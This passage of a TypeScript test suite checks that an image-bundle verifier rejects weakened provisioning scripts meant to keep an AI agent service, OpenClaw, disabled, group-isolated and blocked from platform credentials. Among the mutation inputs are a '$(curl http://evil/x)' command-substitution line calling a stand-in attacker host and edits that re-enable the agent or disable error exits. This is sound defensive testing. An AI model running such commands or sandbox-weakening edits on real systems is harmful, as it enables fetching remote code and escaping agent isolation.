  echo "openclaw must use a nonzero Ubuntu system UID" >&2
  exit 2
fi
`,
          '',
        ),
      );
      let report = await verifyImageBundle(root);
      expect(report.errors).toContain(
        'provision.sh must require a nonzero Ubuntu system UID for openclaw',
      );

      await writeFile(
        provisionPath,
        provision.replace(
          `if [[ "$openclaw_primary_group" != "openclaw" ]] \\
  || [[ "$openclaw_primary_gid" -eq 0 || "$openclaw_primary_gid" -lt 100 || "$openclaw_primary_gid" -gt 999 ]]; then
  echo "openclaw must use the nonzero openclaw Ubuntu system primary group" >&2
  exit 2
fi
`,
          '',
        ),
      );
      report = await verifyImageBundle(root);
      expect(report.errors).toContain(
        'provision.sh must require openclaw as the nonzero Ubuntu system primary group',
      );

      await writeFile(
        provisionPath,
        provision.replace(
          `if [[ "$(getent passwd openclaw | cut -d: -f6)" != "/var/lib/openclaw" ]]; then
  echo "openclaw must use /var/lib/openclaw as its home directory" >&2
  exit 2
fi
`,
          '',
        ),
      );
      report = await verifyImageBundle(root);
      expect(report.errors).toContain(
        'provision.sh must fail unless openclaw uses /var/lib/openclaw as its home directory',
      );
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });

  test('the verifier rejects missing or weakened OpenClaw exact group-set checks', async () => {
    const root = await mkdtemp(join(tmpdir(), 'gbrain-image-contract-'));
    try {
      await cp(imageRoot, root, { recursive: true });
      const provisionPath = join(root, 'scripts', 'provision.sh');
      const provision = await readFile(provisionPath, 'utf8');
      const groupSetCheck = `openclaw_groups="$(id -nG openclaw)"
if [[ "$openclaw_groups" != "openclaw" ]]; then
  echo "openclaw must belong only to the openclaw group" >&2
  exit 2
fi
`;

      await writeFile(provisionPath, provision.replace(groupSetCheck, ''));
      let report = await verifyImageBundle(root);
      expect(report.errors).toContain(
        'provision.sh must require openclaw to belong only to the openclaw group',
      );

      await writeFile(
        provisionPath,
        provision.replace(
          'if [[ "$openclaw_groups" != "openclaw" ]]; then',
          'if [[ "$openclaw_groups" != "openclaw docker" ]]; then',
        ),
      );
      report = await verifyImageBundle(root);
      expect(report.errors).toContain(
        'provision.sh must require openclaw to belong only to the openclaw group',
      );
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });

  test('the verifier rejects runtime paths without root-owned non-writable safeguards', async () => {
    const root = await mkdtemp(join(tmpdir(), 'gbrain-image-contract-'));
    try {
      await cp(imageRoot, root, { recursive: true });
      const provisionPath = join(root, 'scripts', 'provision.sh');
      const provision = await readFile(provisionPath, 'utf8');

      await writeFile(
        provisionPath,
        provision.replace(
          'chown -R root:root "/opt/node-v${NODE_VERSION}" /opt/openclaw /usr/local/bin/openclaw',
          '',
        ),
      );
      let report = await verifyImageBundle(root);
      expect(report.errors).toContain(
        'provision.sh must keep /opt runtime trees and /usr/local/bin/openclaw root-owned',
      );

      await writeFile(
        provisionPath,
        provision.replace(
          'chmod -R go-w "/opt/node-v${NODE_VERSION}" /opt/openclaw /usr/local/bin/openclaw',
          '',
        ),
      );
      report = await verifyImageBundle(root);
      expect(report.errors).toContain(
        'provision.sh must keep /opt runtime trees and /usr/local/bin/openclaw non-group/world-writable',
      );
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });

  test('build and discovery are pinned to an ARM64 A2 builder with 8 GB build memory', async () => {
    const build = await readFile(join(imageRoot, 'build.sh'), 'utf8');
    const preflight = await readFile(join(imageRoot, 'smoke-preflight.ts'), 'utf8');
    const provision = await readFile(join(imageRoot, 'scripts', 'provision.sh'), 'utf8');

    expect(build).toContain('OCI_PACKER_SHAPE:-VM.Standard.A2.Flex');
    expect(build).toContain('OCI_PACKER_OCPUS:-1');
    expect(build).toContain('OCI_PACKER_MEMORY_GB:-8');
    expect(preflight).toContain("const preferred = ['VM.Standard.A2.Flex']");
    expect(preflight).toMatch(/\/aarch64\/i\.test\(image\.displayName\)/);
    expect(preflight).toContain('for (const candidate of orderedBases)');
    expect(preflight).toContain('const compatible = await shapesFor(candidate.id)');
    expect(preflight).toContain('if (compatible.chosen)');
    expect(provision).toContain("dpkg --print-architecture");
    expect(provision).toContain("expected an arm64 base image");
  });

  test('provisioning waits for base-image cloud-init before using apt', async () => {
    const provision = await readFile(
      join(imageRoot, 'scripts', 'provision.sh'),
      'utf8',
    );
    const cloudInitWait = provision.indexOf(
      'timeout 10m cloud-init status --wait',
    );
    const firstApt = provision.indexOf('run_apt update');

    expect(cloudInitWait).toBeGreaterThan(-1);
    expect(cloudInitWait).toBeLessThan(firstApt);
  });

  test('provisioning retries only package-manager lock contention within a bound', async () => {
    const provision = await readFile(
      join(imageRoot, 'scripts', 'provision.sh'),
      'utf8',
    );

    expect(provision).toContain(
      'APT_LOCK_WAIT_SECONDS="${APT_LOCK_WAIT_SECONDS:-300}"',
    );
    expect(provision).toMatch(/run_apt\(\)[\s\S]*Could not get lock/);
    expect(provision).toMatch(/run_apt\(\)[\s\S]*Unable to acquire/);
    expect(provision).not.toMatch(/^\s*apt-get\s/m);
  });

  test('apt retry behavior preserves failures and stops at its bound', async () => {
    const provision = await readFile(
      join(imageRoot, 'scripts', 'provision.sh'),
      'utf8',
    );
    const counter = `count=$(cat "$APT_TEST_COUNT" 2>/dev/null || echo 0)
count=$((count + 1))
printf '%s' "$count" >"$APT_TEST_COUNT"`;

    const recovers = await exerciseAptRetry(
      provision,
      `#!/usr/bin/env bash
${counter}
if [[ "$count" -lt 3 ]]; then
  echo 'E: Could not get lock /var/lib/apt/lists/lock' >&2
  exit 100
fi
exit 0
`,
    );
    expect(recovers.exitCode, recovers.stderr).toBe(0);
    expect(recovers.stdout).toContain('status=0 count=3');

    const nonLockFailure = await exerciseAptRetry(
      provision,
      `#!/usr/bin/env bash
${counter}
echo 'network unavailable' >&2
exit 42
`,
    );
    expect(nonLockFailure.stdout).toContain('status=42 count=1');

    const bounded = await exerciseAptRetry(
      provision,
      `#!/usr/bin/env bash
${counter}
echo 'E: Unable to acquire the dpkg frontend lock' >&2
exit 100
`,
      0,
    );
    expect(bounded.stdout).toContain('status=100 count=1');
  }, 15_000);

  test('provisioning persists public HTTP and HTTPS host-firewall rules', async () => {
    const provision = await readFile(
      join(imageRoot, 'scripts', 'provision.sh'),
      'utf8',
    );

    expect(provision).toContain('iptables-persistent');
    expect(provision).toContain('for port in 80 443');
    expect(provision).toContain('iptables -C INPUT -p tcp --dport "$port"');
    expect(provision).toContain('iptables -I INPUT 1 -p tcp --dport "$port"');
    expect(provision).toContain('netfilter-persistent save');
  });

  test('the deployer-facing bundle satisfies the baked-image contract', async () => {
    const report = await verifyImageBundle(imageRoot);

    expect(report.errors).toEqual([]);
    expect(report.builder).toBe('oracle-oci');
    expect(report.requiredCloudInitKeys).toEqual(REQUIRED_CLOUD_INIT_KEYS);
    expect(report.supervisedServices).toEqual([
      'gbrain-web.service',
      'gbrain-worker.service',
      'gbrain-scheduler.service',
    ]);
    expect(report.disabledServices).toEqual(['gbrain-agent.service']);
    expect(report.agentRuntime).toEqual(AGENT_RUNTIME_CONTRACT);
    expect(report.hasCredentialHelper).toBe(true);
    expect(report.hasUpdateScript).toBe(true);
  });

  test('the verifier rejects a floating OpenClaw dependency', async () => {
    const root = await mkdtemp(join(tmpdir(), 'gbrain-image-contract-'));
    try {
      await cp(imageRoot, root, { recursive: true });
      const manifestPath = join(root, 'openclaw', 'package.json');
      const manifest = await readFile(manifestPath, 'utf8');
      await writeFile(
        manifestPath,
        manifest.replace('"openclaw": "2026.7.1-2"', '"openclaw": "latest"'),
      );

      const report = await verifyImageBundle(root);
      expect(report.errors).toContain(
        'OpenClaw package.json must pin openclaw@2026.7.1-2',
      );
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });

  test('cloud-init applies privileged migrations before starting runtime services', async () => {
    const finalizer = await readFile(
      join(imageRoot, 'files', 'bin', 'gbrain-cloud-init-finalize'),
      'utf8',
    );
    const migration = finalizer.indexOf(
      '--unit=gbrain-cloud-init-migrate',
    );
    const firstRuntimeService = finalizer.indexOf(
      'systemctl enable --now gbrain-worker.service',
    );

    expect(migration).toBeGreaterThan(-1);
    expect(migration).toBeLessThan(firstRuntimeService);
    expect(finalizer).toContain("ALTER ROLE %I SUPERUSER BYPASSRLS");
    expect(finalizer).toContain("ALTER ROLE %I NOSUPERUSER NOBYPASSRLS");
    expect(finalizer).toContain('--property=User=gbrain');
    expect(finalizer).toContain('--setenv=HOME=/var/lib/gbrain');
    expect(finalizer).toContain('--setenv=GBRAIN_HOME=/var/lib/gbrain');
    expect(finalizer).toContain('gbrain workspace-runtime worker --once');
    expect(finalizer).not.toContain('gbrain apply-migrations');
    expect(finalizer).not.toContain('gbrain init --migrate-only');
    expect(finalizer).toMatch(
      /revoke_migration_privileges\ntrap - EXIT/,
    );
  });

  test('Brain-tier cloud-init proves the agent is inert and cannot read Platform Credentials', async () => {
    const finalizer = await readFile(
      join(imageRoot, 'files', 'bin', 'gbrain-cloud-init-finalize'),
      'utf8',
    );

    // A smoke test over the shipped text. These `toContain` lines are weaker
    // than they look — `not.toContain('systemctl enable --now
    // gbrain-agent.service')` says nothing about `systemctl preset
    // gbrain-agent`, for instance. BRAIN_TIER_AGENT_PROOFS and
    // BRAIN_TIER_AGENT_PROHIBITIONS are the authoritative checks; the matrices
    // derived from them below are what actually prove the contract.
    expect(finalizer).toContain('systemctl disable --now gbrain-agent.service');
    expect(finalizer).not.toContain('systemctl enable --now gbrain-agent.service');
    expect(finalizer).toContain('systemctl is-enabled gbrain-agent.service');
    expect(finalizer).toContain('systemctl is-active --quiet gbrain-agent.service');
    expect(finalizer).toContain('sudo -u openclaw test -r "$ENV_FILE"');
    expect(finalizer).toContain('id -nG openclaw');
    expect(finalizer).toContain('findmnt -n -o SOURCE --target /var/lib/openclaw');
    expect(finalizer).toContain('blockdev --getsize64');
    expect(finalizer).toContain(String(AGENT_RUNTIME_CONTRACT.storageLimitBytes));
    expect(finalizer).toContain(
      'iptables -C OUTPUT -m owner --uid-owner openclaw',
    );
    expect(finalizer).toContain(
      'ip6tables -C OUTPUT -m owner --uid-owner openclaw',
    );
    // #57 owns agent-tier enablement: Brain-tier must never create or require
    // the agent-scoped environment file the inert unit conditions on.
    expect(finalizer).not.toContain('/etc/openclaw/agent.env');
    // The best-effort form swallows a failure to stop a running agent.
    expect(finalizer).not.toContain('systemctl disable --now gbrain-agent.service || true');
  });

  test('the verifier rejects Brain-tier cloud-init that enables OpenClaw', async () => {
    const root = await mkdtemp(join(tmpdir(), 'gbrain-image-contract-'));
    try {
      await cp(imageRoot, root, { recursive: true });
      const finalizerPath = join(root, 'files', 'bin', 'gbrain-cloud-init-finalize');
      const finalizer = await readFile(finalizerPath, 'utf8');
      await writeFile(
        finalizerPath,
        finalizer.replace(
          'systemctl disable --now gbrain-agent.service',
          'systemctl enable --now gbrain-agent.service',
        ),
      );

      const report = await verifyImageBundle(root);
      expect(report.errors).toContain(
        'gbrain-agent.service must remain disabled after Brain-tier cloud-init',
      );
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });

  test('the verifier rejects every Brain-tier agent proof being removed', async () => {
    // Derived from the exported table so one new proof row is enforced end to
    // end without a second edit here.
    const root = await mkdtemp(join(tmpdir(), 'gbrain-image-contract-'));
    try {
      await cp(imageRoot, root, { recursive: true });
      const finalizerPath = join(root, 'files', 'bin', 'gbrain-cloud-init-finalize');
      const finalizer = (await readFile(finalizerPath, 'utf8')).replace(/\r\n/g, '\n');
      // Exact count, not a floor: shrinking the table must require a deliberate
      // edit here rather than silently reducing what this matrix covers.
      expect(brainTierAgentProofs.length).toBe(6);

      for (const { patterns, message } of brainTierAgentProofs) {
        for (const pattern of patterns) {
          const match = pattern.exec(finalizer);
          // A proof whose pattern no longer matches the shipped finalizer would
          // make this whole matrix vacuous.
          expect(match, `${message}: ${pattern}`).not.toBeNull();
          await writeFile(finalizerPath, finalizer.replace(match![0], ''));

          const report = await verifyImageBundle(root);
          expect(report.errors, `${message}: ${pattern}`).toContain(message);
        }
      }
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });

  test('the verifier rejects Brain-tier agent proofs defeated by addition or comment', async () => {
    const mutations = [
      // A commented-out proof is not a proof.
      [
        'systemctl disable --now gbrain-agent.service',
        '# systemctl disable --now gbrain-agent.service',
        'gbrain-agent.service must remain disabled after Brain-tier cloud-init',
      ],
      // `|| true` turns a fail-closed stop into a best-effort one.
      [
        'systemctl disable --now gbrain-agent.service',
        'systemctl disable --now gbrain-agent.service || true',
        'gbrain-agent.service must remain disabled after Brain-tier cloud-init',
      ],
      // Re-activation appended AFTER the proofs leaves every proof intact.
      [
        'systemctl enable --now caddy.service',
        'systemctl enable --now caddy.service\nsystemctl enable --now gbrain-agent.service',
        'Brain-tier cloud-init must never re-activate gbrain-agent.service',
      ],
      [
        'systemctl enable --now caddy.service',
        'systemctl enable --now caddy.service\nsystemctl start gbrain-agent.service',
        'Brain-tier cloud-init must never re-activate gbrain-agent.service',
      ],
      [
        'systemctl enable --now caddy.service',
        'systemctl enable --now caddy.service\nsystemctl restart gbrain-agent.service',
        'Brain-tier cloud-init must never re-activate gbrain-agent.service',
      ],
      // systemd resolves a unit name without its type suffix, so requiring
      // `.service` in the activation pattern would let this form through.
      [
        'systemctl enable --now caddy.service',
        'systemctl enable --now caddy.service\nsystemctl enable --now gbrain-agent',
        'Brain-tier cloud-init must never re-activate gbrain-agent.service',
      ],
      // Brain-tier must not materialize the agent-scoped environment.
      [
        'systemctl enable --now caddy.service',
        'install -m 0640 -o root -g openclaw /dev/null /etc/openclaw/agent.env\nsystemctl enable --now caddy.service',
        'Brain-tier cloud-init must not create or require the agent-scoped environment',
      ],
      // Verifying the wrong mount point proves nothing about agent storage.
      [
        'findmnt -n -o SOURCE --target /var/lib/openclaw',
        'findmnt -n -o SOURCE --target /var/lib/gbrain',
        'Brain-tier cloud-init must verify bounded OpenClaw storage',
      ],
      // A different size bound is not the image contract's 10 GiB bound.
      [
        '10737418240',
        '1073741824',
        'Brain-tier cloud-init must verify bounded OpenClaw storage',
      ],
      // Dropping nodev from the accepted option set re-admits device nodes.
      [
        '|| [[ ",$openclaw_options," != *,nodev,* ]] \\\n',
        '',
        'Brain-tier cloud-init must verify bounded OpenClaw storage',
      ],
      [
        'sudo -u openclaw test -r "$ENV_FILE"',
        '# sudo -u openclaw test -r "$ENV_FILE"',
        'Brain-tier cloud-init must prove openclaw cannot read Platform Credentials',
      ],
    ] as const;

    const root = await mkdtemp(join(tmpdir(), 'gbrain-image-contract-'));
    try {
      await cp(imageRoot, root, { recursive: true });
      const finalizerPath = join(root, 'files', 'bin', 'gbrain-cloud-init-finalize');
      const finalizer = (await readFile(finalizerPath, 'utf8')).replace(/\r\n/g, '\n');

      for (const [from, to, expectedError] of mutations) {
        expect(finalizer, `${from} is not present`).toContain(from);
        await writeFile(finalizerPath, finalizer.replace(from, to));

        const report = await verifyImageBundle(root);
        expect(report.errors, `${from} -> ${to}`).toContain(expectedError);
      }
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });

  test('the verifier rejects every systemd form that re-activates the agent', async () => {
    // `enable` is not the only way back on: `preset` applies the default
    // `enable *` policy, `add-wants`/`link` install the unit directly, and a
    // backslash continuation splits the verb from the unit name across lines.
    const reactivations = [
      'systemctl preset gbrain-agent.service',
      'systemctl reenable gbrain-agent.service',
      'systemctl add-wants multi-user.target gbrain-agent.service',
      'systemctl link /etc/systemd/system/gbrain-agent.service',
      'systemctl enable \\\n  gbrain-agent.service',
      // Bare unit names resolve to the .service unit.
      'systemctl preset gbrain-agent',
    ];
    const anchor = 'systemctl enable --now caddy.service';

    await withFinalizerMutations(async (root, finalizerPath, finalizer) => {
      for (const reactivation of reactivations) {
        await writeFile(finalizerPath, finalizer.replace(anchor, `${anchor}\n${reactivation}`));

        const report = await verifyImageBundle(root);
        expect(report.errors, reactivation).toContain(
          'Brain-tier cloud-init must never re-activate gbrain-agent.service',
        );
      }

      // systemd needs no systemctl to enable a unit: the wants symlink IS the
      // enablement, so the verb alternation alone cannot be the whole guard.
      await writeFile(
        finalizerPath,
        finalizer.replace(
          anchor,
          `${anchor}\nln -sf /etc/systemd/system/gbrain-agent.service `
            + '/etc/systemd/system/multi-user.target.wants/gbrain-agent.service',
        ),
      );
      const report = await verifyImageBundle(root);
      expect(report.errors).toContain(
        'Brain-tier cloud-init must never install gbrain-agent.service into a systemd target',
      );
    });
  });

  test('the verifier rejects Brain-tier proofs inverted in place', async () => {
    // Every character the verifier pinned survives these edits; only the sense
    // of the comparison flips, so pinning the command without its test is not a
    // proof of anything.
    const inversions = [
      [
        '[[ "$agent_enabled_state" != "disabled" ]]',
        '[[ "$agent_enabled_state" == "disabled" ]]',
        'Brain-tier cloud-init must prove the agent service is disabled and inactive',
      ],
      [
        'if systemctl is-active --quiet gbrain-agent.service; then',
        'if ! systemctl is-active --quiet gbrain-agent.service; then',
        'Brain-tier cloud-init must prove the agent service is disabled and inactive',
      ],
      [
        'if sudo -u openclaw test -r "$ENV_FILE"; then',
        'if ! sudo -u openclaw test -r "$ENV_FILE"; then',
        'Brain-tier cloud-init must prove openclaw cannot read Platform Credentials',
      ],
    ] as const;

    await withFinalizerMutations(async (root, finalizerPath, finalizer) => {
      for (const [from, to, expectedError] of inversions) {
        expect(finalizer, `${from} is not present`).toContain(from);
        await writeFile(finalizerPath, finalizer.replace(from, to));

        const report = await verifyImageBundle(root);
        expect(report.errors, `${from} -> ${to}`).toContain(expectedError);
      }
    });
  });

  test('the verifier rejects Brain-tier proofs made vacuous', async () => {
    const blockStart = 'systemctl disable --now gbrain-agent.service';
    const blockEnd =
      'ip6tables -C OUTPUT -m owner --uid-owner openclaw -p tcp --dport 5432 -d ::1/128 -j REJECT';

    await withFinalizerMutations(async (root, finalizerPath, finalizer) => {
      // `set +e` turns the bare iptables probes — which fail closed only because
      // errexit aborts on them — into silent no-ops.
      await writeFile(
        finalizerPath,
        finalizer.replace(
          'iptables -C OUTPUT',
          'set +e\niptables -C OUTPUT',
        ),
      );
      expect((await verifyImageBundle(root)).errors).toContain(
        'Brain-tier cloud-init must never disable shell error exits',
      );

      // Re-granting the group after the exact-group-set proof has already run.
      await writeFile(
        finalizerPath,
        finalizer.replace(
          'systemctl enable --now caddy.service',
          'usermod -aG gbrain openclaw\nsystemctl enable --now caddy.service',
        ),
      );
      expect((await verifyImageBundle(root)).errors).toContain(
        'Brain-tier cloud-init must never add openclaw to another group',
      );

      // Every pinned character intact, none of it ever executed.
      await writeFile(
        finalizerPath,
        finalizer
          .replace(blockStart, `if false; then\n${blockStart}`)
          .replace(blockEnd, `${blockEnd}\nfi`),
      );
      expect((await verifyImageBundle(root)).errors).toContain(
        'Brain-tier cloud-init must never wrap the agent proofs in a constant condition',
      );

      // Same trick with an uncalled function: the proofs must live at top level.
      // Every proof is asserted, not just the first — asserting one message let a
      // function-body scanner that stopped at the first column-0 `}` report five
      // of six proofs missing while the sixth read as present and never ran.
      for (const wrapper of [
        // Both header forms. Korn-style `function name {` omits the parentheses
        // that a `name()`-only header regex requires.
        ['prove_agent_inert() {', '}'],
        ['function prove_agent_inert {', '}'],
        ['function prove_agent_inert() {', '}'],
      ] as const) {
        await writeFile(
          finalizerPath,
          finalizer
            .replace(blockStart, `${wrapper[0]}\n${blockStart}`)
            .replace(blockEnd, `${blockEnd}\n${wrapper[1]}`),
        );
        const wrapped = (await verifyImageBundle(root)).errors;
        for (const { message } of BRAIN_TIER_AGENT_PROOFS) {
          expect(wrapped, `${wrapper[0]} did not hide: ${message}`).toContain(message);
        }
      }

      // A lone `}` inside heredoc DATA is not a function close. Treating it as
      // one resumed top-level scanning mid-function and made the rest of an
      // uncalled proof block read as live code.
      await writeFile(
        finalizerPath,
        finalizer
          .replace(
            blockStart,
            `prove_agent_inert() {\ncat >/dev/null <<'DECOY'\n}\nDECOY\n${blockStart}`,
          )
          .replace(blockEnd, `${blockEnd}\n}`),
      );
      const heredocWrapped = (await verifyImageBundle(root)).errors;
      for (const { message } of BRAIN_TIER_AGENT_PROOFS) {
        expect(heredocWrapped, `heredoc brace did not hide: ${message}`).toContain(message);
      }

      // A shell function named `systemctl` neuters every systemctl proof at once
      // while leaving each pinned character in place.
      for (const shadow of ['systemctl() { :; }', 'function systemctl {', 'systemctl(){']) {
        await writeFile(
          finalizerPath,
          finalizer.replace('systemctl daemon-reload', `${shadow}\nsystemctl daemon-reload`),
        );
        expect((await verifyImageBundle(root)).errors, shadow).toContain(
          'Brain-tier cloud-init must never shadow systemctl with a shell function',
        );
      }
    });
  });

  test('the verifier rejects anything inserted into the pinned Brain-tier proof span', async () => {
    // The proof block is required to stay one contiguous, visible, top-level
    // sequence between its anchors. Pinning the span directly catches an
    // inserted opener, a decoy copy, and a function wrapper without any
    // semantic shell analysis — the parser view is only defence in depth.
    //
    // Each distinct span failure names its offending text, so assertions match
    // on the shared PINNED_SPAN_ERROR prefix rather than an exact message.
    const hasSpanError = (errors: readonly string[]): boolean =>
      errors.some(error => error.startsWith(PINNED_SPAN_ERROR));
    const postgres = 'systemctl enable --now postgresql.service\n';
    const blockEnd =
      'ip6tables -C OUTPUT -m owner --uid-owner openclaw -p tcp --dport 5432 -d ::1/128 -j REJECT\n';

    await withFinalizerMutations(async (root, finalizerPath, finalizer) => {
      // An opener that is not a constant condition, so the constant-condition
      // prohibition never sees it.
      await writeFile(
        finalizerPath,
        finalizer
          .replace('systemctl disable --now gbrain-agent.service', 'if [[ -n "${SKIP:-}" ]]; then\nsystemctl disable --now gbrain-agent.service')
          .replace(blockEnd, `${blockEnd}fi\n`),
      );
      expect(hasSpanError((await verifyImageBundle(root)).errors), 'inserted opener').toBe(true);

      // The decoy that defeats a first-occurrence ordering search: every pinned
      // string appears early as inert heredoc DATA while the real block runs
      // once PostgreSQL already holds live credentials.
      const from = finalizer.indexOf('openclaw_groups="$(id -nG openclaw)"');
      const to = finalizer.indexOf(blockEnd) + blockEnd.length;
      const block = finalizer.slice(from, to);
      const relocated = relocate(
        finalizer,
        'openclaw_groups="$(id -nG openclaw)"',
        blockEnd,
        postgres,
      );
      await writeFile(
        finalizerPath,
        relocated.replace(postgres, `cat >/dev/null <<'DECOY'\n${block}DECOY\n${postgres}`),
      );
      expect(hasSpanError((await verifyImageBundle(root)).errors), 'heredoc decoy').toBe(true);

      // Deleting the span's leading anchor unpins the block from the moment the
      // Workspace environment reaches its final permissions.
      await writeFile(finalizerPath, finalizer.replace('chmod 0640 "$ENV_FILE"\n', ''));
      expect(hasSpanError((await verifyImageBundle(root)).errors), 'missing anchor').toBe(true);

      // CRITICAL regression: a statement appended after a proof line. Every
      // pinned character survives, the proof runs, then the append overwrites
      // its result. A presence-probe allow-list authorized these; an anchored
      // one refuses them. Both were reproduced returning `errors: []`.
      for (const [from, to] of [
        [
          'openclaw_groups="$(id -nG openclaw)"',
          'openclaw_groups="$(id -nG openclaw)"; openclaw_groups=openclaw',
        ],
        [
          'openclaw_fstype="$(findmnt -n -o FSTYPE --target /var/lib/openclaw)"',
          'openclaw_fstype="$(findmnt -n -o FSTYPE --target /var/lib/openclaw)"; openclaw_fstype=ext4',
        ],
      ] as const) {
        expect(finalizer, `${from} is not present`).toContain(from);
        await writeFile(finalizerPath, finalizer.replace(from, to));
        expect(hasSpanError((await verifyImageBundle(root)).errors), `appended: ${to}`).toBe(true);
      }

      // A single proof line deleted from inside the span leaves an
      // authorized-looking husk with no unauthorized line — only the
      // completeness check catches the missing row.
      await writeFile(finalizerPath, finalizer.replace('sudo -u openclaw true\n', ''));
      const incompleteErrors = (await verifyImageBundle(root)).errors;
      expect(hasSpanError(incompleteErrors), 'deleted proof line').toBe(true);
      expect(incompleteErrors).toContain(
        `${PINNED_SPAN_ERROR}: \`Brain-tier cloud-init must prove openclaw cannot read Platform Credentials\``
          + ' is not complete inside the span',
      );
    });
  });

  test('the verifier rejects a proof guard whose fatal exit 2 is deleted', async () => {
    // CRITICAL regression: each proof's failure branch must ABORT provisioning.
    // Deleting the lone `exit 2` — leaving the `if …; then`/`… || {` opener, the
    // `echo … >&2` diagnostic, and the closing `fi`/`}` — keeps every pinned
    // character and every pinned condition intact, so the anchored allow-list
    // and the completeness check both still pass. On a VM where the proof fails,
    // cloud-init would then print a warning and CONTINUE to a successful finish
    // instead of failing closed. All six proof guards (the two `|| { … }`
    // storage guards among them) must now produce a span error.
    const guardDiagnostics = [
      'gbrain-agent.service must remain disabled for Brain-tier cloud-init',
      'gbrain-agent.service must remain inactive for Brain-tier cloud-init',
      'openclaw must belong only to the openclaw group',
      'openclaw must not read the GBrain Workspace environment',
      'OpenClaw storage is not mounted at /var/lib/openclaw',
      'OpenClaw storage is not backed by a sizable block device',
      'OpenClaw storage does not match the bounded image contract',
    ];
    const hasSpanError = (errors: readonly string[]): boolean =>
      errors.some(error => error.startsWith(PINNED_SPAN_ERROR));

    await withFinalizerMutations(async (root, finalizerPath, finalizer) => {
      for (const diagnostic of guardDiagnostics) {
        const guard = `  echo "${diagnostic}" >&2\n  exit 2\n`;
        expect(finalizer, `${diagnostic}: guard not present`).toContain(guard);
        // Delete only the terminating `exit 2`, leaving the diagnostic + closer.
        await writeFile(finalizerPath, finalizer.replace(guard, `  echo "${diagnostic}" >&2\n`));

        const report = await verifyImageBundle(root);
        expect(hasSpanError(report.errors), `deleted exit 2 after: ${diagnostic}`).toBe(true);
      }
    });
  });

  test('the verifier rejects a command-substitution prefix on a pinned proof line', async () => {
    // IMPORTANT regression: the narrowed `[^#\n;&|]*` wildcard prefix blocked a
    // `;`/`&`/`|`-joined second command but still admitted a leading backtick or
    // `$(…)` command substitution, which needs no separator. Both ran arbitrary
    // commands (curl/exfil/touch) inside the span the block claims to seal while
    // still counting as an authorized proof line. The prefix is now anchored to
    // a bare variable assignment, so neither form may precede the assignment.
    const hasSpanError = (errors: readonly string[]): boolean =>
      errors.some(error => error.startsWith(PINNED_SPAN_ERROR));

    await withFinalizerMutations(async (root, finalizerPath, finalizer) => {
      for (const prefix of ['`touch /tmp/x` ', '$(curl http://evil/x) ']) {
        await writeFile(
          finalizerPath,
          finalizer.replace(
            'openclaw_groups="$(id -nG openclaw)"',
            `${prefix}openclaw_groups="$(id -nG openclaw)"`,
          ),
        );

        const report = await verifyImageBundle(root);
        expect(hasSpanError(report.errors), `prefix: ${prefix}`).toBe(true);
      }
    });
  });

  test('the verifier accepts a benign reindent of a pinned proof line', async () => {
    // The bare-assignment prefix anchors on `^[ \t]*VAR=`, so re-indenting a
    // proof line is still accepted even as the command-substitution prefix above
    // is refused: the legitimate `$(…)` on the assignment's RHS is preserved.
    await withFinalizerMutations(async (root, finalizerPath, finalizer) => {
      await writeFile(
        finalizerPath,
        finalizer.replace(
          'openclaw_groups="$(id -nG openclaw)"',
          '  openclaw_groups="$(id -nG openclaw)"',
        ),
      );

      expect((await verifyImageBundle(root)).errors).toEqual([]);
    });
  });

  test('the verifier accepts comments and herestrings that mention heredoc syntax', async () => {
    // topLevelShell must not mistake a `<<WORD` inside a comment, or a `<<<WORD`
    // herestring, for a heredoc opener. Either would latch a delimiter that
    // never closes and blank every proof after it, spuriously reporting the
    // whole block missing. Both are inserted BEFORE the proof block so a
    // regression would blank the proofs and fail this accept.
    await withFinalizerMutations(async (root, finalizerPath, finalizer) => {
      for (const benign of [
        '# the psql <<SQL block below is #57 work, never Brain-tier',
        'grep -q x <<<EOF_TEXT || true',
      ]) {
        await writeFile(
          finalizerPath,
          finalizer.replace('chmod 0640 "$ENV_FILE"', `${benign}\nchmod 0640 "$ENV_FILE"`),
        );
        expect((await verifyImageBundle(root)).errors, benign).toEqual([]);
      }
    });
  });

  test('the verifier accepts a #57 hand-off note joined by a line continuation', async () => {
    // `joinShellContinuations` folds this into one logical line, where "will
    // restart" sits between `systemctl` and `gbrain-agent`. Refusing it would
    // fail the build for prose the prohibition's own contract permits.
    await withFinalizerMutations(async (root, finalizerPath, finalizer) => {
      await writeFile(
        finalizerPath,
        finalizer.replace(
          'systemctl daemon-reload',
          'systemctl daemon-reload \\\n  && echo "will restart gbrain-agent in #57"',
        ),
      );

      expect((await verifyImageBundle(root)).errors).toEqual([]);
    });
  });

  test('the verifier rejects Brain-tier proofs moved after the first live service', async () => {
    const postgres = 'systemctl enable --now postgresql.service\n';
    const blockEnd =
      'ip6tables -C OUTPUT -m owner --uid-owner openclaw -p tcp --dport 5432 -d ::1/128 -j REJECT\n';
    const disable = 'systemctl disable --now gbrain-agent.service\n';

    await withFinalizerMutations(async (root, finalizerPath, finalizer) => {
      // The disable stays early; the four remaining proofs run once PostgreSQL
      // already holds live credentials — the wrong window for all of them.
      await writeFile(
        finalizerPath,
        relocate(finalizer, 'openclaw_groups="$(id -nG openclaw)"', blockEnd, postgres),
      );
      const relocatedErrors = (await verifyImageBundle(root)).errors;
      expect(relocatedErrors).toContain(
        'Brain-tier cloud-init must prove the agent is inert before starting services',
      );
      // The span is now incomplete: the relocated rows no longer live between
      // the anchors. Without this assertion the whole `incomplete` branch could
      // be deleted with every test still green.
      expect(relocatedErrors.some(error => error.startsWith(PINNED_SPAN_ERROR))).toBe(true);

      // A decoy disable left behind so a single-line ordering check still sees
      // an early proof while the real block runs late.
      const relocated = relocate(finalizer, disable, blockEnd, postgres);
      await writeFile(finalizerPath, relocated.replace(postgres, `${disable}${postgres}`));
      expect((await verifyImageBundle(root)).errors).toContain(
        'Brain-tier cloud-init must disable gbrain-agent.service exactly once',
      );
    });
  });

  test('the Brain-tier proof table is pinned to exactly the messages proven below', () => {
    // Mirror of the prohibition pin: adding, removing, or reordering a proof is
    // a deliberate edit here, paired with the mutation matrix that proves each
    // row rejects the weakening it names.
    expect(BRAIN_TIER_AGENT_PROOFS.map(({ message }) => message)).toEqual([
      'gbrain-agent.service must remain disabled after Brain-tier cloud-init',
